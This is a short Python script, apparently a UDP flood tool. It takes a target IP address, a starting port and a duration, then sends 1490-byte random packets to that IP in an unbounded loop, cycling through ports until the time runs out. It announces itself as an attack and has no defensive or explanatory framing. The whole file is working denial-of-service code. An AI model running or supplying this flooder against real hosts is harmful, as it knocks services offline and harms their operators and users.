import os
import socket
import time
import sys

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#############

ip = sys.argv[1]
starting_port = int(sys.argv[2])
timeout = int(sys.argv[3])
print("Attack Starting on IP %s", ip)
send_bytes = os.urandom(1490)
sent = 0
port = starting_port
start_time = time.time()
while True:
    sock.sendto(send_bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    if port == 65534:
        port = starting_port
    if time.time() - start_time > timeout:
        break
